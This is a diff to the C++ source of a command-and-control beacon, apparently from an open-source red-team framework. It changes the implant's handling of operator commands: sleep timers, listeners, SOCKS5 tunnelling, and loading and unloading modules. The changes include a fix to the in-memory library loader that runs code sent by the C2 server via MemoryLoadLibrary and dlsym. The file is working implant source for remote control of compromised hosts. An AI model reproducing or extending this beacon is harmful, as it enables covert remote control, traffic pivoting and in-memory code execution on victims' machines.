@@ -117,27 +117,6 @@ Beacon::Beacon(const std::string& ip, int port)
 
 	srand(time(NULL));
 
-// TODO at some point chose which module are directly included , could be this list:
-
-	// std::unique_ptr<Upload> upload = std::make_unique<Upload>();
-	// m_moduleCmd.push_back(std::move(upload));
-
-	// std::unique_ptr<Download> download = std::make_unique<Download>();
-	// m_moduleCmd.push_back(std::move(download));
-
-	// std::unique_ptr<PrintWorkingDirectory> printWorkingDirectory = std::make_unique<PrintWorkingDirectory>();
-	// m_moduleCmd.push_back(std::move(printWorkingDirectory));
-
-	// std::unique_ptr<ChangeDirectory> changeDirectory = std::make_unique<ChangeDirectory>();
-	// m_moduleCmd.push_back(std::move(changeDirectory));
-
-	// std::unique_ptr<ListDirectory> listDirectory = std::make_unique<ListDirectory>();
-	// m_moduleCmd.push_back(std::move(listDirectory));
-
-	// std::unique_ptr<ListProcesses> listProcesses = std::make_unique<ListProcesses>();
-	// m_moduleCmd.push_back(std::move(listProcesses));
-
-
 #ifdef __linux__
 
 	char hostname[HOST_NAME_MAX];
@@ -452,6 +431,9 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		c2RetMessage.set_returnvalue(CmdStatusSuccess);
 		return true;
 	}
+	//
+	// Sleep cmd
+	//
 	else if (instruction == SleepCmd)
 	{
 		std::string newSleepTimer = c2Message.cmd();
@@ -467,6 +449,9 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 
 		c2RetMessage.set_returnvalue(newSleepTimer);
 	}
+	//
+	// Beacon Listener cmd
+	//
 	else if(instruction == ListenerCmd)
 	{
 		std::vector<std::string> splitedCmd;
@@ -555,7 +540,6 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 			if(object!=m_listeners.end())
 			{
 				m_listeners.erase(std::remove(m_listeners.begin(), m_listeners.end(), *object));
-				// std::move(*object);
 				msg = listenerHash;
 			}
 			else 
@@ -565,13 +549,24 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 			c2RetMessage.set_returnvalue(msg);
 		}
 	}
+	//
+	// Socks5 cmd
+	//
 	else if(instruction == Socks5)
 	{
 		SPDLOG_TRACE("Socks5 {} {} {}", c2Message.instruction(), c2Message.cmd(), c2Message.pid());
 
 		c2RetMessage.set_pid(c2Message.pid());
 
-		if(c2Message.cmd()=="init")
+		if(c2Message.cmd()=="start")
+		{
+		}
+		else if(c2Message.cmd() == "stopSocks")
+		{
+			for(int i=0; i<m_socksTunnelClient.size(); i++)
+				m_socksTunnelClient[i].reset(nullptr);
+		}
+		else if(c2Message.cmd()=="init")
 		{
 			SPDLOG_DEBUG("Socks5 init {}: {}:{}", c2Message.pid(), c2Message.data(), c2Message.args());
 			std::unique_ptr<SocksTunnelClient> socksTunnelClient = std::make_unique<SocksTunnelClient>(c2Message.pid());
@@ -658,11 +653,6 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 			}
 			SPDLOG_DEBUG("Socks5 stop Finished");
 		}
-		else if(c2Message.cmd() == "stopSocks")
-		{
-			for(int i=0; i<m_socksTunnelClient.size(); i++)
-				m_socksTunnelClient[i].reset(nullptr);
-		}
 
 		SPDLOG_DEBUG("Finishing");
 
@@ -674,9 +664,13 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		SPDLOG_DEBUG("m_socksTunnelClient size {}", m_socksTunnelClient.size());
 		
 	}
+	//
+	// Load memory module cmd
+	//
 	else if(instruction == LoadC2Module)
 	{
 #ifdef __linux__
+
 		const std::string inputfile = c2Message.inputfile();
 		const std::string buffer = c2Message.data();
 
@@ -686,7 +680,6 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		handle = MemoryLoadLibrary((char*)buffer.data(), buffer.size());
 		if (handle == NULL)
 		{
-
 			std::string msg = "Error MemoryLoadLibrary";
 			c2RetMessage.set_returnvalue(msg);
 			return false;
@@ -694,18 +687,18 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 
 		SPDLOG_DEBUG("MemoryLoadLibrary handle {}", handle);
 		
-		// TODO put functionName to libFunctionName.so -> FunctionNameConstructor
-		// inputfile....
+		// The exported function that expose the constructor must be releated to the libreary file name
+		// file name = libExposedFunctionName.so <-> Exported function name = ExposedFunctionNameConstructor
 		std::string funcName = inputfile;
 		funcName = funcName.substr(3); 							// remove lib
 		funcName = funcName.substr(0, funcName.length() - 3);	// remove .so
-		funcName += "Constructor";
+		funcName += "Constructor";								// add Constructor
 
 		SPDLOG_DEBUG("MemoryLoadLibrary funcName {}", funcName);
 
 		constructProc construct;
 		construct = (constructProc)dlsym(handle, funcName.c_str());
-		if (!construct != NULL) 
+		if(construct == NULL) 
 		{
 			std::string msg = "Error MemoryGetProcAddress";
 			c2RetMessage.set_returnvalue(msg);
@@ -784,8 +777,8 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 	}
 	else if(instruction == UnloadC2Module)
 	{
-#ifdef __linux__
-#elif _WIN32
+		// TODO should be able to close the handle to the dll/so
+		// clean the memory
 		std::string moduleName = c2Message.cmd();
 		unsigned long moduleHash = djb2(moduleName);
 
@@ -804,16 +797,16 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		if(object!=m_moduleCmd.end())
 		{
 			m_moduleCmd.erase(std::remove(m_moduleCmd.begin(), m_moduleCmd.end(), *object));
-			std::move(*object);
 			msg = "Module ";
 			msg += moduleName;
 			msg += " removed.";
 		}
 
 		c2RetMessage.set_returnvalue(msg);
-#endif
 	}
+	//
 	// Command to be executed by a loaded module
+	//
 	else
 	{
 		unsigned long moduleHash = djb2(instruction);
